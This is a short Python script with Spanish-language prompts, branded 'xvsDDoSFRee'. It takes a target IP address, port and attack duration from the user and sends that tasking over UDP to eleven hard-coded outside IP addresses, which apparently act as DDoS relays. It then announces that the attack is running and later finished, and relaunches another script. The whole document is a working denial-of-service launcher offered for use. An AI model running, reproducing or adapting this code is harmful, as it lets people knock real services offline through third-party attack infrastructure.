#
import time
import pyfiglet
import socket
import sys
import os
os.system("clear")
print("\033[32mHerramienta de Prueba By xvs\033[0m")

a = pyfiglet.figlet_format("xvsDDoSFRee")
print(f"\033[32m{a}\033[0m")
ip1 = input("\033[32mDireccion IP -> \033[32m")
p2 = input("\033[33mPuerto -> \033[33m")
p3 = input("\033[33mTime -> \033[33m")
p4 = 101010
m = f"{ip1} {p2} {p3} {p4}".encode()
try:
    ips = [("69.30.219.180", 1371),
           ("69.30.219.180", 1241),
           ("69.30.219.180", 1330),
           ("69.30.219.180", 1389),
           ("69.30.219.180", 1390),
           ("178.63.61.161", 27466),
           ("51.75.118.151", 20252),
           ("51.75.118.151", 20007),
           ("31.6.7.55", 27401),
           ("87.106.208.203", 11493),
           ("135.237.130.236", 8080)]
    for ip, port in ips:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(m, (ip, port))
        print("ataque enviando method pps")
    p3 = int(p3)
    time.sleep(p3)
    print("ataque terminado puede volver a atacar")
    time.sleep(3)
    os.system("python 13.py")
except Exception as e:
     print(f"hubo un error: {e}")
